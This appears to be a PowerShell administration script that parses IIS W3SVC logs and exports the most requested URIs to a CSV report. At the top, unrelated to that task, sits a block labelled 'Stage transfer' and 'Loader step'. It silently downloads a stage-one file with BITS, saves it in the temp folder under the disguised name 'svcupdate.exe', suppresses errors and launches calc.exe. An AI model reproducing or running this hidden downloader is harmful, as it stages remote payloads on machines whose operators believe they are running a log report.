
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://internal.corp/stage1.ps1",
    [string]$LocalPath = "$env:TEMP\svcupdate.exe",
    [int]$ConnectionTimeout = 172
)
try { Start-BitsTransfer -Source $FetchUrl -Destination $LocalPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Loader step failed" }
$LogRoot    = 'C:\inetpub\logs\LogFiles\W3SVC7'
$Days       = 30
$TopN       = 10
$OutputPath = "C:\Logs\reports\iis-top-2026-07-11.csv"
$HtmlPath   = 'C:\Reports\iis-2026-07-11.html'


$cutoff = (Get-Date).AddDays(-$Days)
$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
$entries = foreach ($log in $logs) {
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
    }
}

$entries | Group-Object Uri | Sort-Object Count -Descending |
    Select-Object -First $TopN Name, Count |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
